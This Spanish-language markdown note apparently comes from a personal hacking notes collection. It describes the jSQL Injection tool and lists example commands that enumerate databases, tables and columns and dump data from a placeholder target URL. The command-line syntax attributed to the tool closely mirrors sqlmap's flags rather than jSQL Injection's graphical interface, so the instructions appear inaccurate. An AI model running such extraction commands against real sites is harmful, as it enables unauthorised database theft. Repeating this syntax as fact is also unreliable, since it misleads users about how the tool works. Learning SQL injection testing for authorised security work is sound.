### **Hacking Web/Inyecciones SQL/jsql_injection.md**

# jSQL Injection

## Descripción

`jSQL Injection` es una herramienta de inyección SQL con una interfaz gráfica de usuario que facilita la detección y explotación de vulnerabilidades de inyección SQL en aplicaciones web. Permite realizar pruebas automatizadas y personalizadas para extraer datos de bases de datos vulnerables.

## Uso

```bash
jsql_injection [opciones]
```

### Opciones principales

- `-u URL`: Especifica la URL objetivo para la inyección SQL.
- `-p PARAM`: Define el parámetro vulnerable a probar.
- `--technique TECH`: Selecciona la técnica de inyección (boolean, time, error).
- `--dump`: Extrae el contenido de la base de datos.
- `--dbs`: Enumera las bases de datos disponibles.
- `--tables`: Enumera las tablas de una base de datos específica.
- `--columns`: Enumera las columnas de una tabla específica.
- `--threads N`: Define el número de hilos para acelerar la explotación.

## Ejemplos

- Probar una URL para inyección SQL y enumerar las bases de datos:
  
  ```bash
  jsql_injection -u "http://example.com/page.php?id=1" -p id --technique boolean --dbs
  ```

- Extraer todas las tablas de una base de datos específica:
  
  ```bash
  jsql_injection -u "http://example.com/page.php?id=1" -p id --technique boolean -D nombre_db --tables --dump
  ```

- Extraer columnas específicas de una tabla:
  
  ```bash
  jsql_injection -u "http://example.com/page.php?id=1" -p id --technique boolean -D nombre_db -T nombre_tabla --columns columna1,columna2 --dump
  ```

- Usar múltiples hilos para acelerar la explotación:
  
  ```bash
  jsql_injection -u "http://example.com/page.php?id=1" -p id --technique boolean --threads 10 --dbs
  ```
